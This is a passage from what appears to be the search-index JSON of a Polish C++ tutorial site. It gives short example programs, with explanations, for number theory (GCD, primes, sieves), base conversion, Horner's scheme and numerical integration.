0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/gcd/#algorytm-euklidesa-wersja-rekurencyjna","title":"Algorytm Euklidesa - wersja rekurencyjna","text":""},{"location":"programming/c%2B%2B/algorithms/integers/gcd/#implementacja_2","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint gcd(int a, int b) {\n    if(b == 0) {\n        return a;\n    }\n\n    return gcd(b, a % b);\n}\n\nint main() {\n    int a = 32;\n    int b = 12;\n\n    int result = gcd(a, b);\n\n    cout &lt;&lt; \"gcd(\" &lt;&lt; a &lt;&lt; \",\" &lt;&lt; b &lt;&lt; \") = \" &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/gcd/#operacje-binarne-wersja-iteracyjna","title":"Operacje binarne - wersja iteracyjna","text":""},{"location":"programming/c%2B%2B/algorithms/integers/gcd/#implementacja_3","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint gcd(int a, int b) {\n    int shift;\n\n    if (a == 0) {\n        return b;\n    }\n\n    if (b == 0) {\n        return a;\n    }\n\n    for (shift = 0; ((a | b) &amp; 1) == 0; shift++) {\n        a &gt;&gt;= 1;\n        b &gt;&gt;= 1;\n    }\n\n    while ((a &amp; 1) == 0) {\n        a &gt;&gt;= 1;\n    }\n\n    while (b != 0) {\n        while ((b &amp; 1) == 0) {\n            b &gt;&gt;= 1;\n        }\n\n        if (a &gt; b) {\n            swap(a, b);\n        }\n\n        b = b - a;\n    }\n\n    return a &lt;&lt; shift;\n}\n\nint main() {\n    int a = 32;\n    int b = 12;\n\n    int result = gcd(a, b);\n\n    cout &lt;&lt; \"gcd(\" &lt;&lt; a &lt;&lt; \",\" &lt;&lt; b &lt;&lt; \") = \" &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/gcd/#operacje-binarne-wersja-rekurencyjna","title":"Operacje binarne - wersja rekurencyjna","text":""},{"location":"programming/c%2B%2B/algorithms/integers/gcd/#implementacja_4","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint gcd(int a, int b) {\n    if (a == b) {\n        return a;\n    }\n\n    if (a == 0) {\n        return b;\n    }\n\n    if (b == 0) {\n        return a;\n    }\n\n    if (~a &amp; 1) {\n        if (b &amp; 1) {\n            return gcd(a &gt;&gt; 1, b);\n        } else {\n            return gcd(a &gt;&gt; 1, b &gt;&gt; 1) &lt;&lt; 1;\n        }\n    }\n\n    if (~b &amp; 1) {\n        return gcd(a, b &gt;&gt; 1);\n    }\n\n    if (a &gt; b) {\n        return gcd((a - b) &gt;&gt; 1, b);\n    }\n\n    return gcd((b - a) &gt;&gt; 1, a);\n}\n\nint main() {\n    int a = 32;\n    int b = 12;\n\n    int result = gcd(a, b);\n\n    cout &lt;&lt; \"gcd(\" &lt;&lt; a &lt;&lt; \",\" &lt;&lt; b &lt;&lt; \") = \" &lt;&lt; result &lt;&lt; endl;\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/perfect-test/","title":"Test doskona\u0142o\u015bci","text":""},{"location":"programming/c%2B%2B/algorithms/integers/perfect-test/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/integers/perfect-test/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cmath&gt;\n\nusing namespace std;\n\nbool isPerfect(int n) {\n    int sum = 0;\n\n    for (int i = 1; i &lt; n; i++) {\n        if (n % i == 0) {\n            sum += i;\n        }\n    }\n\n    return sum == n;\n}\n\nint main() {\n    int n = 6;\n\n    bool result = isPerfect(n);\n\n    if (result) {\n        cout &lt;&lt; n &lt;&lt; \" is perfect\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; n &lt;&lt; \" is not perfect\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/prime-factors/","title":"Rozk\u0142ad na czynniki pierwsze","text":""},{"location":"programming/c%2B%2B/algorithms/integers/prime-factors/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/integers/prime-factors/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid distribute(int n) {\n    int factor = 2;\n\n    while(n &gt; 1) {\n        if(n % factor == 0) {\n            cout &lt;&lt; factor &lt;&lt; \" \";\n            n /= factor;\n        } else {\n            factor++;\n        }\n    }\n}\n\nint main() {\n    int n = 124;\n\n    cout &lt;&lt; \"Prime factors of \" &lt;&lt; n &lt;&lt; \": \";\n    distribute(n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/prime-factors/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>distribute</code> (linia 5) przyjmuje jeden parametr: liczb\u0119 naturaln\u0105 do roz\u0142o\u017cenia na czynniki pierwsze. Na pocz\u0105tku tworzymy zmienn\u0105 do przechowywania warto\u015bci kolejnych czynnik\u00f3w (linia 6). Nast\u0119pnie wykonujemy dzia\u0142ania w p\u0119tli tak d\u0142ugo, jak d\u0142ugo mo\u017cemy jeszcze rozk\u0142ada\u0107 \\(n\\) na czynniki pierwsze (linia 8). Wewn\u0105trz p\u0119tli sprawdzamy, czy \\(n\\) jest podzielne przez obecnie sprawdzany czynnik (linia 9). Je\u017celi tak, to wypisujemy czynnik na ekranie (linia 10) i dzielimy \\(n\\) przez ten czynnik (linia 11). W przeciwnym przypadku (linia 12) przechodzimy do kolejnego czynnika, zwi\u0119kszaj\u0105c jego warto\u015b\u0107 o jeden (linia 13).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej przygotowujemy dane wej\u015bciowe, czyli liczb\u0119 do roz\u0142o\u017cenia na czynniki pierwsze (linia 19). Nast\u0119pnie wypisujemy stosowny komunikat (linia 21) oraz wywo\u0142ujemy funkcj\u0119 rozk\u0142adaj\u0105c\u0105 \\(n\\) na czynniki pierwsze (linia 22). Na koniec ko\u0144czymy dzia\u0142anie programu (linia 24).</p>"},{"location":"programming/c%2B%2B/algorithms/integers/prime-test/","title":"Test pierwszo\u015bci","text":""},{"location":"programming/c%2B%2B/algorithms/integers/prime-test/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/integers/prime-test/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cmath&gt;\n\nusing namespace std;\n\nbool isPrime(int n) {\n    if (n &lt; 2) {\n        return false;\n    }\n\n    for (int i = 2; i &lt;= sqrt(n); i++) {\n        if(n % i == 0) {\n            return false;\n        }\n    }\n\n    return true;\n}\n\nint main() {\n    int n = 7;\n\n    bool result = isPrime(n);\n\n    if (result) {\n        cout &lt;&lt; n &lt;&lt; \" is prime\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; n &lt;&lt; \" is not prime\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/integers/segment-sieve/","title":"Sito Segmentowe","text":""},{"location":"programming/c%2B%2B/algorithms/integers/segment-sieve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/integers/segment-sieve/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cmath&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nvector&lt;int&gt; sieve(int n) {\n    vector&lt;int&gt; primes;\n    vector&lt;bool&gt; is_prime(n + 1, true);\n\n    for (int i = 2; i * i &lt;= n; i++) {\n        if (is_prime[i]) {\n            for (int j = i * i; j &lt;= n; j += i) {\n                is_prime[j] = false;\n            }\n        }\n    }\n\n    for(int i = 2; i &lt;= n; i++) {\n        if (is_prime[i]) {\n            primes.push_back(i);\n        }\n    }\n\n    return primes;\n}\n\nvector&lt;int&gt; segment_sieve(int num_from, int num_to) {\n    int limit = sqrt(num_to) + 1;\n    vector&lt;int&gt; primes = sieve(limit);\n\n    int n = num_to - num_from + 1;\n    vector&lt;int&gt; is_prime(n, true);\n\n    for (int p : primes) {\n        int start = (num_from / p) * p;\n        if (start &lt; num_from) {\n            start += p;\n        }\n        if (start == p) {\n            start += p;\n        }\n        for (int j = start; j &lt;= num_to; j += p) {\n            is_prime[j - num_from] = false;\n        }\n    }\n\n    vector&lt;int&gt; result;\n    for (int i = 0; i &lt; n; i++) {\n        if (is_prime[i]) {\n            result.push_back(i + num_from);\n        }\n    }\n\n    return result;\n} \n\nint main() {\n    int num_from, num_to;\n\n    num_from = 100;\n    num_to = 200;\n\n    vector&lt;int&gt; primes = segment_sieve(num_from, num_to);\n\n    for(int prime : primes) {\n        cout &lt;&lt; prime &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/matrix/det3/","title":"Wyznacznik macierzy 3x3","text":""},{"location":"programming/c%2B%2B/algorithms/matrix/det3/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/matrix/det3/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint det3(int matrix[3][3]) {\n    return matrix[0][0] * matrix[1][1] * matrix[2][2] + matrix[1][0] * matrix[2][1] * matrix[0][2] + matrix[2][0] * \\\n           matrix[0][1] * matrix[1][2] - matrix[0][2] * matrix[1][1] * matrix[2][0] - matrix[0][1] * matrix[1][0] * \\\n           matrix[2][2] - matrix[0][0] * matrix[1][2] * matrix[2][1];\n}\n\nint main() {\n    int matrix[3][3] = {{1, 2, 3}, \n                        {4, 5, 6}, \n                        {7, 8, 9}};\n\n    int result = det3(matrix);\n\n    cout &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/matrix/det3/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>det3</code> (linia 5) wylicza wyznacznik macierzy \\(3\\times3\\) przekazanej jako parametr funkcji. Wewn\u0105trz funkcji mamy tylko jedn\u0105 operacj\u0119 zwracaj\u0105c\u0105 wyznacznik macierzy obliczony zgodnie ze wzorem.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej najpierw przygotowujemy macierz (linia 12), nast\u0119pnie obliczamy jej wyznacznik (linia 16) i wypisujemy go na ekranie (linia 18). Na koniec ko\u0144czymy dzia\u0142anie programu (linia 20).</p>"},{"location":"programming/c%2B%2B/algorithms/numeral-systems/base-conversion/","title":"Konwersja pomi\u0119dzy systemami liczbowymi","text":""},{"location":"programming/c%2B%2B/algorithms/numeral-systems/base-conversion/#opis-problemu","title":"Opis problemu","text":"<p>Systemy liczbowe</p>"},{"location":"programming/c%2B%2B/algorithms/numeral-systems/base-conversion/#konwersja-z-dziesietnego","title":"Konwersja z dziesi\u0119tnego","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstring fromDec(int number, int newBase) {\n    string converted = \"\";\n    int remainder = 0;\n\n    while (number &gt; 0) {\n        remainder = number % newBase;\n        number = number / newBase;\n\n        if (remainder &gt; 9) {\n            converted = (char)('A' + remainder - 10) + converted;\n        } else {\n            converted = (char)(remainder + '0') + converted;\n        }\n    }\n\n    return converted;\n}\n\nint main() {\n    int number = 241;\n    int base = 16;\n\n    string converted = fromDec(number, base);\n\n    cout &lt;&lt; number &lt;&lt; \"(10) = \" &lt;&lt; converted &lt;&lt; \"(\" &lt;&lt; base &lt;&lt; \")\" &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/numeral-systems/base-conversion/#konwersja-na-dziesietny","title":"Konwersja na dziesi\u0119tny","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint toDec(string number, int base) {\n    int converted = 0;\n    int power = 1;\n    int i = number.length() - 1;\n    int value;\n\n    while (i &gt;= 0) {\n        if (number[i] &lt;= '9') {\n            converted += (number[i] - '0') * power;\n        } else {\n            value = number[i] - 'A' + 10;\n            converted += value * power;\n        }\n\n        power *= base;\n        i -= 1;\n    }\n\n    return converted;\n}\n\nint main() {\n    string number = \"AF2\";\n    int base = 16;\n\n    int converted = toDec(number, base);\n\n    cout &lt;&lt; number &lt;&lt; \"(\" &lt;&lt; base &lt;&lt; \") = \" &lt;&lt; converted &lt;&lt; \"(10)\" &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/numerical-methods/fast-exp/","title":"Szybkie pot\u0119gowanie","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/fast-exp/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/fast-exp/#rozwiazanie-iteracyjne","title":"Rozwi\u0105zanie iteracyjne","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint fastExp(int a, int n) {\n    int result = 1;\n\n    while (n &gt; 0) {\n        if (n % 2 == 1) {\n            result *= a;\n        }\n\n        a *= a;\n        n /= 2;\n    }\n\n    return result;\n}\n\nint main() {\n    int a = 2;\n    int n = 10;\n\n    int result = fastExp(a, n);\n\n    cout &lt;&lt; a &lt;&lt; \"^\" &lt;&lt; n &lt;&lt; \" = \" &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/numerical-methods/fast-exp/#rozwiazanie-rekurencyjne","title":"Rozwi\u0105zanie rekurencyjne","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint fastExp(int a, int n) {\n    if (n == 0) {\n        return 1;\n    }\n\n    int result = fastExp(a, n / 2);\n\n    if (n % 2 == 1) {\n        return result * result * a;\n    } else {\n        return result * result;\n    }\n}\n\nint main() {\n    int a = 2;\n    int n = 10;\n\n    int result = fastExp(a, n);\n\n    cout &lt;&lt; a &lt;&lt; \"^\" &lt;&lt; n &lt;&lt; \" = \" &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/numerical-methods/horner/","title":"Schemat Hornera","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/horner/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/horner/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\ndouble hornerPolynomial(double coef[], double x, int n) {\n    double result = 0;\n    for(int i = n; i &gt;= 0; i--) {\n        result *= x;\n        result += coef[i];\n    }\n\n    return result;\n}\n\nvoid printPolynomial(double coef[], int n) {\n    cout &lt;&lt; \"f(x) = \" &lt;&lt; coef[0];\n    for(int i = 1; i &lt;= n; i++) {\n        cout &lt;&lt; \" + \" &lt;&lt; coef[i] &lt;&lt; \"x^\" &lt;&lt; i; \n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    double coef[3] = {1, 2, 3};\n    double x = 2;\n    int n = 2;\n    double result;\n\n    printPolynomial(coef, n);\n\n    result = hornerPolynomial(coef, x, n);\n\n    cout &lt;&lt; \"f(\" &lt;&lt; x &lt;&lt; \") = \" &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/numerical-methods/horner/#opis-implementacji","title":"Opis implementacji","text":"<p>Zacznijmy od funkcji pomocniczej <code>printPolynomial</code> (linia 15), kt\u00f3rej celem jest wy\u015bwietlenie wielomianu w czytelnej formie na ekranie. Nie jest ona niezb\u0119dn\u0105 cz\u0119\u015bci\u0105 algorytmu, ale mo\u017ce by\u0107 pomocna przy weryfikacji poprawno\u015bci wyniku. Funkcja przyjmuje dwa parametry: tablic\u0119 wsp\u00f3\u0142czynnik\u00f3w wielomianu <code>coef</code>, oraz stopie\u0144 wielomianu <code>n</code>. W tablicy znajduje si\u0119 dok\u0142adnie \\(n+1\\) liczb. Wsp\u00f3\u0142czynniki s\u0105 zapisane w kolejno\u015bci od najmniejszej pot\u0119gi (\\(0\\)) do najwi\u0119kszej (\\(n\\)).</p> <p>Na pocz\u0105tku funkcji wypisujemy pierwszy wsp\u00f3\u0142czynnik (linia 16). Nast\u0119pnie przechodzimy p\u0119tl\u0105 przez kolejne elementy tablicy (linia 17), wypisuj\u0105c wsp\u00f3\u0142czynnik przy \\(i\\)-tej pot\u0119dze przemno\u017cony przez \\(x\\) podniesione do pot\u0119gi \\(i\\).  </p> <p>Przejd\u017amy teraz do w\u0142a\u015bciwej implementacji algorytmu obliczania warto\u015bci wielomianu za pomoc\u0105 schematu Hornera, czyli do funkcji <code>hornerPolynomial</code> (linia 5). Funkcja ta przyjmuje podobne parametry jak pomocnicza funkcja <code>printPolynomial</code>, ale ponadto przyjmuje tak\u017ce warto\u015b\u0107 \\(x\\), kt\u00f3r\u0105 mamy przyj\u0105\u0107 podczas oblicze\u0144. Wsp\u00f3\u0142czynniki i stopie\u0144 wielomianu podane s\u0105 w takiej samej formie jak wcze\u015bniej.</p> <p>Na pocz\u0105tku tworzymy zmienn\u0105 <code>result</code>, w kt\u00f3rej b\u0119dziemy zapisywa\u0107 wyniki oblicze\u0144, i przypisujemy jej warto\u015b\u0107 \\(0\\) (linia 6). Nast\u0119pnie przechodzimy p\u0119tl\u0105 przez kolejne wsp\u00f3\u0142czynniki wielomianu, poczynaj\u0105c od wsp\u00f3\u0142czynnika przy najwy\u017cszej pot\u0119dze (linia 7). Zauwa\u017cmy, \u017ce korzystamy tutaj z p\u0119tli malej\u0105cej. W p\u0119tli wykonujemy dwie operacje: przemna\u017camy wynik dotychczasowych oblicze\u0144 przez warto\u015b\u0107 <code>x</code> (linia 8), a nast\u0119pnie dodajemy do wyniku warto\u015b\u0107 kolejnego wsp\u00f3\u0142czynnika (linia 9). Po przej\u015bciu przez wszystkie wsp\u00f3\u0142czynniki wystarczy zwr\u00f3ci\u0107 wynik oblicze\u0144 (linia 12).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej definiujemy warto\u015bci parametr\u00f3w naszych oblicze\u0144 (linie 25-27), wypisujemy wielomian w czytelnej formie korzystaj\u0105c z pomocniczej funkcji <code>printPolynomial</code> (linia 30), obliczamy warto\u015b\u0107 wielomianu za pomoc\u0105 funkcji <code>hornerPolynomial</code> (linia 32) i wypisujemy wynik na ekranie (linia 34). Na koniec ko\u0144czymy dzia\u0142anie programu (linia 36).</p>"},{"location":"programming/c%2B%2B/algorithms/numerical-methods/monte-carlo/","title":"Metoda Monte Carlo","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/monte-carlo/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/monte-carlo/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;random&gt;\n#include &lt;ctime&gt;\n\nusing namespace std;\n\ndouble monteCarloPi(int pointsCount) {\n    int numPointsInCircle = 0;\n    double centerX = 1;\n    double centerY = 1;\n    double radius = 1;\n    double x, y, distance;\n\n    for (int i = 0; i &lt; pointsCount; i++) {\n        x = (double) rand() / RAND_MAX * 2.0;\n        y = (double) rand() / RAND_MAX * 2.0;\n        distance = ((x - centerX) * (x - centerX)) + ((y - centerY) * (y - centerY));\n\n        if (distance &lt;= radius * radius) {\n            numPointsInCircle += 1;\n        }\n    }\n\n    return (4.0 * numPointsInCircle) / (double) pointsCount;\n}\n\nint main() {\n    srand(time(NULL));\n\n    int pointsCount = 10000;\n\n    double estimatedPi = monteCarloPi(pointsCount);\n\n    cout &lt;&lt; \"PI ~= \" &lt;&lt; estimatedPi &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/numerical-methods/numerical-integration/","title":"Ca\u0142kowanie numeryczne","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/numerical-integration/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/numerical-integration/#metoda-prostokatow","title":"Metoda prostok\u0105t\u00f3w","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/numerical-integration/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\ndouble f(double x) {\n    return x * x + 2 * x;\n}\n\ndouble rectanglesMethod(int a, int b, int n) {\n    double width = (b - a) / (double)n;\n    double area = 0;\n    double currentPoint = a;\n    double height;\n\n    for(int i = 0; i &lt; n; i++) {\n        currentPoint += width;\n        height = f(currentPoint);\n        area += height * width;\n    }\n\n    return area;\n}\n\nint main() {\n    int a = 1;\n    int b = 5;\n    int n = 100;\n\n    double area = rectanglesMethod(a, b, n);\n\n    cout &lt;&lt; area &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/numerical-methods/numerical-integration/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>f</code> (linia 5) przyjmuje jeden parametr rzeczywisty i jako wynik zwraca liczb\u0119 rzeczywist\u0105. Funkcja ta symuluje funkcj\u0119 matematyczn\u0105, kt\u00f3rej pole pod wykresem chcemy policzy\u0107. </p> <p>Funkcja <code>rectanglesMethod</code> (linia 9) realizuje algorytm ca\u0142kowania numerycznego metod\u0105 prostok\u0105t\u00f3w i przyjmuje trzy parametry: pocz\u0105tek przedzia\u0142u (<code>a</code>), koniec przedzia\u0142u (<code>b</code>) oraz liczb\u0119 prostok\u0105t\u00f3w (<code>n</code>). Funkcja jako wynik zwraca liczb\u0119 rzeczywist\u0105 reprezentuj\u0105c\u0105 przybli\u017cenie pola pod wykresem funkcji \\(f(x)=x^2+2x\\) na przedziale \\(&lt;a, b&gt;\\). Wewn\u0105trz funkcji zaczynamy od policzenia szeroko\u015bci jednego prostok\u0105ta, dziel\u0105c d\u0142ugo\u015b\u0107 przedzia\u0142u przez liczb\u0119 prostok\u0105t\u00f3w (linia 10). Nast\u0119pnie tworzymy zmienn\u0105 do zapami\u0119tania obliczanego pola (linia 11) oraz zmienn\u0105 do zapami\u0119tania obecnej pozycji na osi \\(x\\) (linia 12), a tak\u017ce zmienn\u0105 do zapami\u0119tywania obliczanych wysoko\u015bci prostok\u0105t\u00f3w (linia 13). W nast\u0119pnej kolejno\u015bci przechodzimy p\u0119tl\u0105 \\(n\\) razy (linia 15). Wewn\u0105trz p\u0119tli przesuwamy obecn\u0105 pozycj\u0119 na osi \\(x\\) w prawo o szeroko\u015b\u0107 jednego prostok\u0105ta (linia 16). Nast\u0119pnie obliczamy wysoko\u015b\u0107 prostok\u0105ta w obecnym punkcie poprzez obliczenie warto\u015bci funkcji w tym miejscu (linia 17). Obliczon\u0105 wysoko\u015b\u0107 wykorzystujemy do policzenia pola obecnego prostok\u0105ta i dodania go do zliczanego pola pod wykresem funkcji (linia 18). Na koniec funkcji, po wyj\u015bciu z p\u0119tli, zwracamy obliczone pole pod wykresem funkcji (linia 21).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu przygotowujemy dane do naszego algorytmu: pocz\u0105tek przedzia\u0142u (linia 25), koniec przedzia\u0142u (linia 26) oraz liczb\u0119 prostok\u0105t\u00f3w (linia 27). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>rectanglesMethod</code> z przygotowanymi danymi, a jej wynik zapisujemy w zmiennej <code>area</code> (linia 29). Na koniec wypisujemy wynik na ekranie (linia 31) oraz ko\u0144czymy dzia\u0142anie programu (linia 33).</p>"},{"location":"programming/c%2B%2B/algorithms/numerical-methods/numerical-integration/#metoda-trapezow","title":"Metoda trapez\u00f3w","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/numerical-integration/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\ndouble f(double x) {\n    return x * x + 2 * x;\n}\n\ndouble trapezesMethod(int a, int b, int n) {\n    double height = (b - a)/(double)n;\n    double area = 0;\n    double currentPoint = a;\n    double side1, side2;\n\n    for(int i = 0; i &lt; n; i++) {\n        side1 = f(currentPoint);\n        currentPoint += height;\n        side2 = f(currentPoint);\n        area += ((side1 + side2) * height) / 2.0;\n    }\n\n    return area;\n}\n\nint main() {\n    int a = 1;\n    int b = 5;\n    int n = 100;\n\n    double area = trapezesMethod(a, b, n);\n\n    cout &lt;&lt; area &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/numerical-methods/numerical-integration/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>f</code> (linia 5) przyjmuje jeden parametr rzeczywisty i jako wynik zwraca liczb\u0119 rzeczywist\u0105. Funkcja ta symuluje funkcj\u0119 matematyczn\u0105, kt\u00f3rej pole pod wykresem chcemy policzy\u0107. </p> <p>Funkcja <code>trapezesMethod</code> (linia 9) realizuje algorytm ca\u0142kowania numerycznego metod\u0105 trapez\u00f3w i przyjmuje trzy parametry: pocz\u0105tek przedzia\u0142u (<code>a</code>), koniec przedzia\u0142u (<code>b</code>) oraz liczb\u0119 trapez\u00f3w (<code>n</code>). Funkcja jako wynik zwraca liczb\u0119 rzeczywist\u0105 reprezentuj\u0105c\u0105 przybli\u017cenie pola pod wykresem funkcji \\(f(x)=x^2+2x\\) na przedziale \\(&lt;a, b&gt;\\). Wewn\u0105trz funkcji zaczynamy od policzenia wysoko\u015bci jednego trapezu, dziel\u0105c d\u0142ugo\u015b\u0107 przedzia\u0142u przez liczb\u0119 trapez\u00f3w (linia 10). Nast\u0119pnie tworzymy zmienn\u0105 do zapami\u0119tania obliczanego pola (linia 11) oraz zmienn\u0105 do zapami\u0119tania obecnej pozycji na osi \\(x\\) (linia 12), a tak\u017ce zmienne do pami\u0119tania d\u0142ugo\u015bci podstaw tworzonych trapez\u00f3w (linia 13). W nast\u0119pnej kolejno\u015bci przechodzimy p\u0119tl\u0105 \\(n\\) razy (linia 15). Wewn\u0105trz p\u0119tli obliczamy d\u0142ugo\u015b\u0107 pierwszej podstawy trapezu (linia 16), a nast\u0119pnie przesuwamy obecn\u0105 pozycj\u0119 na osi \\(x\\) w prawo o wysoko\u015b\u0107 jednego trapezu (linia 17). Nast\u0119pnie obliczamy d\u0142ugo\u015b\u0107 drugiej podstawy trapezu w obecnym punkcie poprzez obliczenie warto\u015bci funkcji w tym miejscu (linia 18). Obliczone d\u0142ugo\u015bci podstaw wykorzystujemy do policzenia pola obecnego trapezu i dodania go do zliczanego pola pod wykresem funkcji (linia 19). Na koniec funkcji, po wyj\u015bciu z p\u0119tli, zwracamy obliczone pole pod wykresem funkcji (linia 22).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu przygotowujemy dane do naszego algorytmu: pocz\u0105tek przedzia\u0142u (linia 26), koniec przedzia\u0142u (linia 27) oraz liczb\u0119 prostok\u0105t\u00f3w (linia 28). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>trapezesMethod</code> z przygotowanymi danymi, a jej wynik zapisujemy w zmiennej <code>area</code> (linia 30). Na koniec wypisujemy wynik na ekranie (linia 32) oraz ko\u0144czymy dzia\u0142anie programu (linia 34).</p>"},{"location":"programming/c%2B%2B/algorithms/numerical-methods/simpson-integration/","title":"Metoda Simpsona","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/simpson-integration/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/numerical-methods/simpson-integration/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\ndouble f(double x) {\n    return x * x + 2 * x;\n}\n\ndouble simpsonMethod(double a, double b, int n) {\n    double h = (b - a) / n;\n    double sum = f(a) + f(b);\n\n    for (int i = 1; i &lt; n; i += 2) {\n        sum += 4 * f(a + i * h);\n    }\n\n    for (int i = 2; i &lt; n - 1; i += 2) {\n        sum += 2 * f(a + i * h);\n    }\n\n    return (h / 3) * sum;\n}\n\nint main() {\n    double a = 1;\n    double b = 5;\n    int n = 100;\n\n    double area = simpsonMethod(a, b, n);\n\n    cout &lt;&lt; area &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/numerical-methods/simpson-integration/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>f</code> (linia 5) przyjmuje jeden parametr rzeczywisty i jako wynik zwraca liczb\u0119 rzeczywist\u0105. Funkcja ta symuluje funkcj\u0119 matematyczn\u0105, kt\u00f3rej pole pod wykresem chcemy policzy\u0107. </p> <p>Funkcja <code>simpsonMethod</code> (linia 9) realizuje algorytm ca\u0142kowania numerycznego metod\u0105 Simpsona i przyjmuje trzy parametry: pocz\u0105tek przedzia\u0142u (<code>a</code>), koniec przedzia\u0142u (<code>b</code>) oraz liczb\u0119 podzia\u0142\u00f3w (<code>n</code>). Funkcja jako wynik zwraca liczb\u0119 rzeczywist\u0105 reprezentuj\u0105c\u0105 przybli\u017cenie pola pod wykresem funkcji \\(f(x)=x^2+2x\\) na przedziale \\([a, b]\\).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu przygotowujemy dane do naszego algorytmu: pocz\u0105tek przedzia\u0142u (linia 25), koniec przedzia\u0142u (linia 26) oraz liczb\u0119 podzia\u0142\u00f3w (linia 27). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>simpsonMethod</code> z przygotowanymi danymi, a jej wynik zapisujemy w zmiennej <code>area</code> (linia 29). Na koniec wypisujemy wynik na ekranie (linia 31) oraz ko\u0144czymy dzia\u0142anie programu (linia 